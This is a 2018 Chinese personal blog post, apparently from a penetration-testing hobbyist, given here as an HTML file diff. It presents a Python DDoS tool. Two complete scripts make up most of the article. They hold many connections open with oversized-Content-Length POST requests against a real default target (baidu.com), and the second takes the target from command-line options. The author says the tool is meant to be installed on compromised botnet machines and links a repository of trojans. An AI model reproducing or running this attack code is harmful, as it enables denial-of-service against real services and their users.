@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  
+  <title>
+    基于python的ddos工具 | Leticia‘s Blog 
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+  <meta name="author" content="麻薯">
+
+
+
+  <meta name="keywords" content=",python,ddos">
+<meta name="description" content="0x00 ddos分布式拒绝服务(DDoS:Distributed Denial of Service)攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DDoS攻击，从而成倍地提高拒绝服务攻击的威力。通常，攻击者使用一个偷窃帐号将DDoS主控程序安装在一个计算机上，在一个设定的时间主控程序将与大量代理程序通讯，代理程序已经被安装在网络上的许多计算机上。代理程序收">
+<meta property="og:type" content="article">
+<meta property="og:title" content="基于python的ddos工具 | Leticia‘s Blog">
+<meta property="og:url" content="http://yoursite.com/2018/06/04/基于python的ddos工具/index.html">
+<meta property="og:site_name" content="Leticia‘s Blog">
+<meta property="og:description" content="0x00 ddos分布式拒绝服务(DDoS:Distributed Denial of Service)攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DDoS攻击，从而成倍地提高拒绝服务攻击的威力。通常，攻击者使用一个偷窃帐号将DDoS主控程序安装在一个计算机上，在一个设定的时间主控程序将与大量代理程序通讯，代理程序已经被安装在网络上的许多计算机上。代理程序收">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/python_ddos/ddos01.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/python_ddos/ddos02.png">
+<meta property="og:updated_time" content="2018-06-04T03:58:43.518Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="基于python的ddos工具 | Leticia‘s Blog">
+<meta name="twitter:description" content="0x00 ddos分布式拒绝服务(DDoS:Distributed Denial of Service)攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DDoS攻击，从而成倍地提高拒绝服务攻击的威力。通常，攻击者使用一个偷窃帐号将DDoS主控程序安装在一个计算机上，在一个设定的时间主控程序将与大量代理程序通讯，代理程序已经被安装在网络上的许多计算机上。代理程序收">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/echohun/blog_image/master/python_ddos/ddos01.png">
+
+  <!-- favicon icon files -->
+
+  <link rel="icon" type="image/x-icon" href="/images/favicon.ico">
+  <link rel="icon" href="/images/favicon.ico">
+
+  <!-- css files -->
+  <link rel="stylesheet" href="/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/css/uno.css">
+  <link rel="stylesheet" href="/css/tagscloud.css">
+  <link rel="stylesheet" href="/css/links.css">
+  <link rel="stylesheet" href="/css/archive.css">
+  <link rel="stylesheet" href="/css/jquery.fancybox.css">
+  <link href="//cdn.bootcss.com/highlight.js/9.8.0/styles/monokai-sublime.min.css" rel="stylesheet">
+  <script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
+</head>
+<body>
+  <!-- mobile menu -->
+  <span class="mobile btn-mobile-menu">
+    <i class="fa btn-mobile-menu__icon fa-bars" aria-hidden="true"></i>
+  </span>
+  <!-- side panel -->
+  
+  <header class="panel-cover panel-cover--collapsed">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+      
+        <a href="/" title="link to homepage for Leticia‘s Blog"><img src="/images/avatar.jpg" width="80" alt="Leticia‘s Blog logo" class="panel-cover__logo logo" /></a>
+      
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">麻薯</a></h1>
+        <hr class="panel-cover__divider" />
+        
+        <p class="panel-cover__description">
+          She will never see the day it blossoms,maybe.
+        </p>
+        <hr class="panel-cover__divider" />
+        
+        <!-- TagsCloud -->
+        
+
+  <div id="tagscloud">
+<a href="/tags/渗透测试/" class="tagc1">渗透测试 : 27</a><a href="/tags/笔记/" class="tagc2">笔记 : 13</a><a href="/tags/python/" class="tagc3">python : 10</a><a href="/tags/php/" class="tagc4">php : 9</a><a href="/tags/mysql/" class="tagc5">mysql : 6</a><a href="/tags/网络安全/" class="tagc1">网络安全 : 5</a><a href="/tags/sql注入/" class="tagc2">sql注入 : 5</a><a href="/tags/暴力破解/" class="tagc3">暴力破解 : 4</a><a href="/tags/ctf/" class="tagc4">ctf : 3</a><a href="/tags/文件上传/" class="tagc5">文件上传 : 3</a><a href="/tags/硬件安全/" class="tagc1">硬件安全 : 2</a><a href="/tags/代码审计/" class="tagc2">代码审计 : 2</a><a href="/tags/内网渗透/" class="tagc3">内网渗透 : 2</a><a href="/tags/XSS/" class="tagc4">XSS : 2</a><a href="/tags/密码学/" class="tagc5">密码学 : 2</a><a href="/tags/snort/" class="tagc1">snort : 1</a><a href="/tags/https/" class="tagc2">https : 1</a><a href="/tags/ssl/" class="tagc3">ssl : 1</a><a href="/tags/SSRF/" class="tagc4">SSRF : 1</a><a href="/tags/mssql/" class="tagc5">mssql : 1</a>
+</div>
+
+        <div class="navigation-wrapper">
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+            
+              
+              <li class="navigation__item"><a href="/#blog" title="" class="blog-button">博客</a></li>
+            
+              
+              <li class="navigation__item"><a href="/archive/" title="" class="">归档</a></li>
+            
+              
+              <li class="navigation__item"><a href="/links/" title="" class="">友链</a></li>
+            
+            </ul>
+          </nav>
+          
+<hr class="panel-cover__divider">
+<nav class="cover-navigation navigation--social">
+  <ul class="navigation">
+    
+      <!-- Github -->
+      <li class="navigation__item">
+        <a href="https://github.com/echohun" title="麻薯's GitHub">
+          <i class='fa fa-github'></i>
+          <span class="label">GitHub</span>
+        </a>
+      </li>
+    
+    
+    
+  </ul>
+</nav>
+
+        </div>
+      </div>
+    </div>
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+  <div class="content-wrapper">
+    <div class="content-wrapper__inner entry">
+      <!-- body panel -->
+      
+<article class="post-container post-container--single">
+  <header class="post-header">
+    <h1 class="post-title">基于python的ddos工具</h1>
+    
+    <div class="post-meta">
+      <time datetime="2018-06-04 11:55:01" class="post-meta__date date">2018-06-04 11:55:01</time> 
+      <span class="post-meta__tags tags">
+      
+        <font class="categories">&#8226; 分类:
+        <a class="categories-link" href="/categories/python/">python</a>
+        </font>
+      
+      
+        &#8226; 标签:
+        <font class="tags">
+        <a class="tags-link" href="/tags/ddos/">ddos</a>, <a class="tags-link" href="/tags/python/">python</a>
+        </font>
+      
+      </span>
+    </div>
+    
+  </header>
+  <section id="post-content" class="article-content post">
+  <h2 id="0x00-ddos"><a href="#0x00-ddos" class="headerlink" title="0x00 ddos"></a>0x00 ddos</h2><p>分布式拒绝服务(DDoS:Distributed Denial of Service)攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DDoS攻击，从而成倍地提高拒绝服务攻击的威力。通常，攻击者使用一个偷窃帐号将DDoS主控程序安装在一个计算机上，在一个设定的时间主控程序将与大量代理程序通讯，代理程序已经被安装在网络上的许多计算机上。代理程序收到指令时就发动攻击。利用客户/服务器技术，主控程序能在几秒钟内激活成百上千次代理程序的运行。</p>
+<p>这里我选择用python来写安装在肉鸡上的代理程序。</p>
+<h2 id="0x01-需要安装的库"><a href="#0x01-需要安装的库" class="headerlink" title="0x01 需要安装的库"></a>0x01 需要安装的库</h2><ul>
+<li>socket: Python 提供了两个基本的 socket 模块。第一个是 Socket，它提供了标准的 BSD Sockets API。第二个是 SocketServer，它提供了服务器中心类，可以简化网络服务器的开发。</li>
+<li>time: 在产生错误时我们可以sleep一个时间来查看错误。</li>
+<li>threading： 多线程的库，增加我们的请求量。</li>
+<li>optparse： 此模块用来处理命令行参数，使我们在统一管理时更方便。</li>
+</ul>
+<h2 id="0x02-代码实现"><a href="#0x02-代码实现" class="headerlink" title="0x02 代码实现"></a>0x02 代码实现</h2><p>我们先不加命令行参数写一个，方便调试。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">#python3.6</div><div class="line"></div><div class="line">import socket</div><div class="line">import time</div><div class="line">import threading</div><div class="line"></div><div class="line">MAX_CONN=10</div><div class="line">PORT=80</div><div class="line">HOST=&quot;www.baidu.com&quot;</div><div class="line">PAGE=&quot;/&quot;</div><div class="line"></div><div class="line">data=(&quot;POST %s HTTP/1.1\r\n&quot;</div><div class="line">&quot;Host: %s\r\n&quot;</div><div class="line">&quot;Content-Length: 1000000000\r\n&quot;</div><div class="line">&quot;Cookie: ddos_test\r\n&quot;</div><div class="line">&quot;\r\n&quot; % (PAGE,HOST))</div><div class="line"></div><div class="line">data2=data.encode(&apos;utf-8&apos;)</div><div class="line"></div><div class="line">socks=[]</div><div class="line"></div><div class="line">def conn_thread():</div><div class="line">    global socks</div><div class="line">    for i in range(0,MAX_CONN):</div><div class="line">        s=socket.socket (socket.AF_INET,socket.SOCK_STREAM)</div><div class="line">        try:</div><div class="line">            s.connect((HOST,PORT))</div><div class="line">            s.send(data2)</div><div class="line">            print(&quot;[+] Send data OK!,conn=%d\n&quot; % i)</div><div class="line">            socks.append(s)</div><div class="line">        except:</div><div class="line">            print (&quot;[-] Could not connect to server or send error&quot;)</div><div class="line">            time.sleep(5)</div><div class="line"></div><div class="line"></div><div class="line">def send_thread():</div><div class="line">    global socks</div><div class="line">    while True:</div><div class="line">        for s in socks:</div><div class="line">            try:</div><div class="line">                s.send(b&quot;f&quot;)</div><div class="line">                print (&quot;[+] send OK! %s&quot;%s)</div><div class="line">            except:</div><div class="line">                print (&quot;[-] send error\n&quot;)</div><div class="line">                socks.remove(s)</div><div class="line">                s.close()</div><div class="line">        time.sleep(1)</div><div class="line"></div><div class="line"></div><div class="line">conn_th=threading.Thread(target=conn_thread,args=())</div><div class="line">send_th=threading.Thread(target=send_thread,args=())</div><div class="line">conn_th.start()</div><div class="line">send_th.start()</div></pre></td></tr></table></figure>
+<p>这里我们仅设置了10个最大连接数，然后向百度的80端口不断发送post请求。</p>
+<p>效果如下：</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/python_ddos/ddos01.png" alt=""></p>
+<h2 id="0x03-增加命令行参数"><a href="#0x03-增加命令行参数" class="headerlink" title="0x03 增加命令行参数"></a>0x03 增加命令行参数</h2><p>实际情况中，我们经常要把ddos脚本放在我们已经控制的僵尸网络中，控制大量的计算机启动脚本，我们肯定不能每切换攻击一个目标就对代码中的参数更改一次，所以我们要使目标ip，端口，页面，以及攻击的强度通过我们输入参数来更改，为实现这个目标，我们导入optparse库接收命令行参数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div></pre></td><td class="code"><pre><div class="line">#python3.6</div><div class="line"></div><div class="line">#用例：python ddos.py -w &quot;www.hao123.com&quot; -p 80 -n 200 --page &quot;/&quot;</div><div class="line">#-h查看帮助</div><div class="line">#-w参数和-p参数不可缺省</div><div class="line"></div><div class="line">import optparse</div><div class="line">import socket</div><div class="line">import time</div><div class="line">import threading</div><div class="line"></div><div class="line"></div><div class="line">socks=[]</div><div class="line"></div><div class="line">def conn_thread(PORT,HOST,data2,MAX_CONN):</div><div class="line">    global socks</div><div class="line">    for i in range(0,MAX_CONN):</div><div class="line">        s=socket.socket (socket.AF_INET,socket.SOCK_STREAM)</div><div class="line">        try:</div><div class="line">            s.connect((HOST,PORT))</div><div class="line">            s.send(data2)</div><div class="line">            print(&quot;[+] Send data OK!,conn=%d\n&quot; % i)</div><div class="line">            socks.append(s)</div><div class="line">        except:</div><div class="line">            print (&quot;[-] Could not connect to server or send error&quot;)</div><div class="line">            time.sleep(5)</div><div class="line"></div><div class="line"></div><div class="line">def send_thread():</div><div class="line">    global socks</div><div class="line">    while True:</div><div class="line">        for s in socks:</div><div class="line">            try:</div><div class="line">                s.send(b&quot;f&quot;)</div><div class="line">                print (&quot;[+] send OK! %s&quot;%s)</div><div class="line">            except:</div><div class="line">                print (&quot;[-] send error\n&quot;)</div><div class="line">                socks.remove(s)</div><div class="line">                s.close()</div><div class="line">        time.sleep(1)</div><div class="line"></div><div class="line"></div><div class="line">def main():</div><div class="line">    MAX_CONN = 10</div><div class="line">    PORT = 80</div><div class="line">    HOST = &quot;www.baidu.com&quot;</div><div class="line">    PAGE = &quot;/&quot;</div><div class="line">    MAX_CONN = 10</div><div class="line"></div><div class="line">    parser = optparse.OptionParser()</div><div class="line">    parser.add_option(&apos;-w&apos;, dest=&apos;HOST&apos;, type=&apos;string&apos;, help=&quot;IP address or Website&quot;)</div><div class="line">    parser.add_option(&apos;-p&apos;, dest=&apos;PORT&apos;, type=&apos;int&apos;, help=&quot;Port num&quot;)</div><div class="line">    parser.add_option(&apos;-n&apos;, dest=&apos;MAX_CONN&apos;, type=&apos;int&apos;, help=&quot;Max connect num&quot;)</div><div class="line">    parser.add_option(&apos;--page&apos;, dest=&apos;PAGE&apos;, type=&apos;string&apos;, help=&quot;Url page&quot;)</div><div class="line">    (options, args) = parser.parse_args()</div><div class="line">    if(options.HOST==None)|(options.PORT==None):</div><div class="line">        print(&apos;---wrong input!---&apos;+&apos;\n&apos;)</div><div class="line">        exit(0)</div><div class="line">    else:</div><div class="line">        HOST = options.HOST</div><div class="line">        PORT = options.PORT</div><div class="line">    if(options.PAGE):</div><div class="line">        PAGE = options.PAGE</div><div class="line">    if(options.MAX_CONN):</div><div class="line">        MAX_CONN = options.MAX_CONN</div><div class="line"></div><div class="line">    data = (&quot;POST %s HTTP/1.1\r\n&quot;</div><div class="line">            &quot;Host: %s\r\n&quot;</div><div class="line">            &quot;Content-Length: 1000000000\r\n&quot;</div><div class="line">            &quot;Cookie: ddos_test\r\n&quot;</div><div class="line">             &quot;\r\n&quot; % (PAGE, HOST))</div><div class="line">    print(&quot;****************************&quot;)</div><div class="line">    print(&quot;****************************&quot;)</div><div class="line">    print(data)</div><div class="line">    print(&quot;MAX_CONN=&#123;0&#125;&quot;.format(MAX_CONN))</div><div class="line">    print(&quot;****************************&quot;)</div><div class="line">    print(&quot;****************************&quot;)</div><div class="line">    data2 = data.encode(&apos;utf-8&apos;)</div><div class="line">    time.sleep(5)</div><div class="line">    conn_th=threading.Thread(target=conn_thread,args=(PORT,HOST,data2,MAX_CONN))</div><div class="line">    send_th=threading.Thread(target=send_thread,args=())</div><div class="line">    conn_th.start()</div><div class="line">    send_th.start()</div><div class="line"></div><div class="line"></div><div class="line">if __name__ ==&apos;__main__&apos;:</div><div class="line">    main()</div></pre></td></tr></table></figure>
+<p>我们通过optparse库读取命令行输入参数，其中host和port是必要参数，max_conn和page是可选参数。</p>
+<p>效果如下：</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/python_ddos/ddos02.png" alt=""></p>
+<p>我们植入肉鸡后，就可以通过命令行调用程序并选择攻击目标了。</p>
+<h2 id="0x04-其他"><a href="#0x04-其他" class="headerlink" title="0x04 其他"></a>0x04 其他</h2><p>blog中所有写好的工具，以及常用的木马、字典，都放在<br><a href="https://github.com/echohun/tools" target="_blank" rel="external">https://github.com/echohun/tools</a> 感兴趣的大佬们可以star一下，十分感激。</p>
+
+  </section>
+  <div class="copyright">
+    <span>文本标题:</span><a href="/2018/06/04/基于python的ddos工具/" target="_blank">基于python的ddos工具</a><br />
+    <span>文章作者:</span><a href="/" title="回到主页" target="_blank">麻薯</a><br />
+    <span>发布时间:</span>2018-06-04 11:55:01<br />
+    <span>最后更新:</span>2018-06-04 11:58:43<br />
+    <span>原始链接:</span><a href="http://www.uuzdaisuki.com">www.uuzdaisuki.com</a><br />
+    <span>转载声明:</span><i class="fa fa-creative-commons"></i>转载请保留原文链接及作者。
+  </div>
+</article>
+      <!-- footer panel -->
+      <footer class="footer">
+	<center>
+    <span class="footer__copyright">&copy; 2016-2017. | ❤ <a href="mailto:virink@outlook.com"> Virink </a> | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/virink/vhuno">vHuno</a></span>
+    <span>本站采用<i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"知识共享 署名-非商业性使用-禁止演绎 4.0 国际 许可协议"</a></span>
+    </center>
+</footer>
+    </div>
+  </div>
+  <!-- js files -->
+  <script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/js/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/js/main.js"></script>
+  <script src="/js/scale.fix.js"></script>
+  <script src="/js/tagcloud.js"></script>
+  
+  
+	<script src="/js/jquery.fancybox.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			$(".fancybox").fancybox({
+	            padding: 0,
+	            helpers: {
+	                overlay: {
+	                  locked: false
+	                }
+	            }
+	        });
+		});
+	</script>
+
+  
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+    MathJax.Hub.Config({ 
+        tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+    });
+});
+    </script>
+
+  <script src="//cdn.bootcss.com/highlight.js/9.8.0/highlight.min.js"></script>
+  <script src="/js/gallery.js"></script>
+  <script>
+  $(document).ready(function(){
+    hljs.initHighlightingOnLoad();
+  });
+  </script>
+  
+  
+<div id="totop" style="position: fixed; bottom: 50px; right: 30px; cursor: pointer; opacity: 1;">
+	<a title="back to top"><img style="width:30px;height:30px;" src="/images/totop.png"></a>
+</div>
+<script>
+    (function($) {
+        var upperLimit = 100;
+        var scrollElem = $('#totop');
+        var scrollSpeed = 500;
+        scrollElem.hide();
+        $(window).scroll(function() {
+            var scrollTop = $(document).scrollTop();
+            if (scrollTop > upperLimit) {
+                $(scrollElem).stop().fadeTo(300, 1); // fade back in
+            } else {
+                $(scrollElem).stop().fadeTo(300, 0); // fade out
+            }
+        });
+        $(scrollElem).click(function() {
+            $('html, body').animate({
+                scrollTop: 0
+            }, scrollSpeed);
+            return false;
+        });
+    })(jQuery);
+    </script>
+
+
+  <!-- Analytics Google -->
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-83885261-1', 'auto');
+  ga('send', 'pageview');
+</script>
+  
+    <script src="/js/jquery.githubRepoWidget.min.js"></script>
+
+  <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+</body>
+</html>
